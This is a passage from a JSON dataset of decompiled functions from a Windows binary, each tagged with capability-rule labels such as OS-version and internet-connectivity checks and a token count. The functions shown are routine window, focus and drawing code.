            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fbc0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x43fce9;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x497c14 + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x497c14 + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.004075f4();\n            fcn.0040da70();\n            fcn.00404eb4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4957f8;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x497c14 + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.00453f34();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.00442848();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.0040546c(0x43fcf0);\n    return;\n}\n",
        "token_count": 763
    },
    "0043fd3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043fd3c(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x43fd97;\n                fcn.004197d8();\n                puStack28 = 0x43fd9e;\n                fcn.00458dc8();\n            }\n            pcStack32 = 0x43fdf4;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.004197d8();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x43fdfb;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x43fdec;\n                fcn.004197d8();\n                pcStack32 = 0x43fdf3;\n                fcn.00458dc8();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.0043fd3c::var_10h;\n        pcStack32 = fcn.0043fcf8;\n        uStack36 = 0x43fe2e;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.004543ac();\n    return;\n}\n",
        "token_count": 565
    },
    "00440014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00440014(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x4914f0 = *0x4914f0 + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x497c18 + 100) = param_2;\n    *(*0x497c18 + 0x68) = in_EAX;\n    fcn.0041991c();\n    fcn.00419854();\n    cVar2 = fcn.004047cc();\n    if (cVar2 == '\\0') {\n        *(*0x497c18 + 0x6c) = 0;\n    }\n    else {\n        *(*0x497c18 + 0x6c) = in_EAX;\n        fcn.0041991c();\n        fcn.00419854();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x4402b4;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x497c18 + 0x78)) {\n        if (*(*0x497c18 + 0x78) != 0) {\n            fcn.00457a28();\n            *(*0x497c18 + 0x78) = 0;\n            cVar2 = fcn.0043aed4();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        *(*0x497c18 + 0x78) = in_EAX;\n        fcn.00457a28();\n        cVar2 = fcn.0043aed4();\n        if (cVar2 == '\\0') {\n            fcn.00404f60();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.00453880(),  cVar2 == '\\0'))) {\n            fcn.00457a28();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.0043aed4();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.00457a28();\n            cVar2 = fcn.0043aed4();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004047cc();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.00450f7c(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.00450f7c(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x4402b4 & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1099
    },
    "004402bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004402bc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.00457e58(0, 1);\n    }\n    uVar1 = fcn.00457a28();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.00457a28();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00440334": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440334(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x276) = param_2;\n    if (*(in_EAX + 0x2c4) != 0) {\n        fcn.00450f7c(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x268) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.00457e58(0, 1);\n            fcn.0043fee8();\n        }\n        fcn.004403e8();\n        fcn.004402bc();\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "00440398": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440398(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.00450f7c(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.0043e90c();\n        if (iVar1 != 0) {\n            fcn.0043e90c();\n            fcn.00440398();\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004403e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004403e8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x497c14 + 0x44) != 0)) && (*(*(*0x497c14 + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x497c14 + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x497c14 + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.00437d28();\n        }\n        else {\n            fcn.00437d0c();\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "00440578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440578(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = 0x440594;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.00424c44();\n    uStack48 = 0x440773;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4405b3;\n    puStack44 = &stack0xfffffffc;\n    fcn.00424f48();\n    uStack60 = 0x440750;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = var_8h;\n    puStack72 = 0x4405ca;\n    puStack56 = &stack0xfffffffc;\n    var_ch = sub.gdi32.dll_SaveDC();\n    iStack76 = 0x440703;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar3 = fcn.0044726c();\n    cVar1 = fcn.00447558();\n    if ((cVar1 != '\\0') || ((var_4h[0xa6] != 0 && (*(iVar3 + 8) != '\\0')))) {\n        (**(*var_4h + 0x44))();\n        if (*(iVar3 + 0x28) == '\\0') {\n            uVar2 = *(var_4h[0xa9] + 8) ^ 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            *(var_4h[0xa9] + 8) = 0;\n        }\n        else {\n            iStack76 = var_10h - *(iVar3 + 0x18);\n            puStack80 = var_14h - *(iVar3 + 0x14);\n            puStack72 = var_8h;\n            sub.gdi32.dll_ExcludeClipRect();\n        }\n        if (var_4h[0xa6] == 0) {\n            iStack76 = 4;\n            puStack80 = 0x440673;\n            puStack80 = sub.gdi32.dll_GetStockObject();\n            puStack80 = fcn.00424ec0(&fcn.00440578::var_1ch);\n            sub.user32.dll_FillRect();\n        }\n        else {\n            iStack76 = 0x4406a4;\n            fcn.0042482c();\n            iStack76 = 0x4406b7;\n            fcn.00424948();\n            iStack76 = 0x4406c2;\n            iStack76 = fcn.00423aa4();\n            puStack80 = 0x4406d1;\n            puStack80 = fcn.00424ec0();\n            sub.gdi32.dll_SetBkColor();\n            fcn.00424bd0();\n        }\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x44070a;\n    iStack76 = var_ch;\n    puStack80 = var_8h;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 899
    },
    "00440aa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440aa4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        (**(*in_EAX + -0x10))();\n        return;\n    }\n    fcn.00456c9c();\n    return;\n}\n",
        "token_count": 89
    },
    "00440abc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440abc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x8f) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        fcn.00457a28();\n        iVar1 = fcn.0043ab74();\n        if (iVar1 == 0) {\n            uVar2 = fcn.00457a28(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar2);\n            uVar2 = fcn.00457a28(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar2);\n            if (*(in_EAX + 0x276) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.00450400();\n            return;\n        }\n    }\n    fcn.00451948();\n    return;\n}\n",
        "token_count": 279
    },
    "00440d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440d34(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x440dcf;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.00436e3c();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.00446504();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0044c9d8();\n            fcn.00446504();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x440dd6;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 444
    },
    "004410e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004410e4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "00441150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00441150(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x4412ba;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.0044c724(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.004410e4();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x004412a4;\n            fcn.0044111c(&fcn.00441150::var_8h);\n            fcn.00418360();\n            fcn.0044f754();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.004410a4(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.004410a4(&stack0xfffffffc);\n            }\n            fcn.00418360();\n            fcn.0044f754();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.0044613c();\n            }\n            else if (var_dh == '\\0') {\n                fcn.004460ac();\n            }\n        }\n        else {\n            fcn.004461c4();\n            fcn.004461c4();\n        }\n    }\ncode_r0x004412a4:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x4412c1;\n    uStack72 = 0x4412b9;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 639
    },
    "00441368": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441368(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if ((((*(in_EAX + 0xd2) != '\\0') && ((in_EAX[0xc] == 0 || ((*(in_EAX + 7) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == in_EAX[0x12] && (*(*(param_2 + 8) + 0x14) == in_EAX[0x13])))) {\n        fcn.0043ea0c();\n        fcn.00442f1c();\n        fcn.0043ea0c();\n        fcn.00442f1c();\n        fcn.0044133c(arg_8h);\n        fcn.0043ea0c();\n        fcn.00442f1c();\n        fcn.0044133c(arg_8h_00);\n        fcn.0044133c(&stack0xfffffffc);\n        fcn.0044133c(&stack0xfffffffc);\n    }\n    fcn.00455e24();\n    iVar2 = fcn.0044726c();\n    cVar1 = fcn.00447558();\n    if (((cVar1 != '\\0') && (*(iVar2 + 0x28) == '\\0')) && (*(var_4h + 0x57) != '\\0')) {\n        iVar3 = *(param_2 + 8);\n        if ((*(iVar3 + 0x10) != 0) || (*(iVar3 + 0x14) != 0)) {\n            iVar5 = *(iVar3 + 0x10) - var_4h[0x12];\n            iVar3 = *(iVar3 + 0x14) - var_4h[0x13];\n            if ((iVar5 != 0) || (iVar3 != 0)) {\n                (**(*var_4h + 0x44))();\n                fcn.00418388(&var_24h, var_8h - *(iVar2 + 0x18));\n                if ((*(iVar2 + 0x10) < var_18h) || (iVar3 < 1)) {\n                    if (0 < iVar3) {\n                        var_18h = var_18h + iVar3;\n                    }\n                    if (var_18h < var_20h) {\n                        var_18h = var_20h;\n                    }\n                }\n                else {\n                    var_18h = var_20h - iVar3;\n                    var_20h = *(iVar2 + 0x18);\n                    *(var_4h[0xa9] + 8) = 1;\n                }\n                iVar2 = *(iVar2 + 0xc);\n                if ((var_1ch < iVar2) && (0 < iVar5)) {\n                    var_24h = var_1ch - iVar5;\n                    *(var_4h[0xa9] + 8) = 1;\n                    var_1ch = iVar2;\n                }\n                else {\n                    if (0 < iVar5) {\n                        var_1ch = var_1ch + iVar5;\n                    }\n                    if (var_1ch < var_24h) {\n                        var_1ch = var_24h;\n                    }\n                }\n                uVar4 = fcn.00457a28(&var_24h, 0);\n                sub.user32.dll_InvalidateRect(uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1017
    },
    "00441698": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441698(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x441cf4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x4416d9;\n        fcn.004075f4();\n        puStack40 = 0x4416e8;\n        fcn.0040da70();\n        puStack40 = 0x4416ed;\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x4416f7;\n    fcn.004465f4();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x441cd7;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x441ba9;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x497c18 + 0x6c) == in_EAX) {\n                puStack52 = 0x441bd7;\n                fcn.004403e8();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x441bee;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x441c2b;\n                iVar3 = fcn.00457a28();\n                puStack52 = 0x441c32;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x441c3e;\n                    fcn.00457a28();\n                    puStack52 = 0x441c43;\n                    iVar3 = fcn.0043ab74();\n                    if (iVar3 == 0) {\n                        puStack52 = 0x441c4f;\n                        fcn.00457a28();\n                        puStack52 = 0x441c54;\n                        iVar7 = fcn.0043ae98();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x441c89;\n                    iStack56 = fcn.00457a28();\n                    uStack60 = 0x441c8f;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.00457a28(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    sub.user32.dll_SetActiveWindow(iVar7);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.00457a28(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x441750;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x4417ac;\n                    iVar3 = fcn.0044f640();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4417c8;\n                    iVar3 = fcn.0044f684();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4417e3;\n                    iVar3 = fcn.0044319c();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4417fc;\n                    iVar3 = fcn.00443190();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x441815;\n                iVar3 = fcn.004431b4();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x441823;\n                    fcn.004431b4();\n                }\n        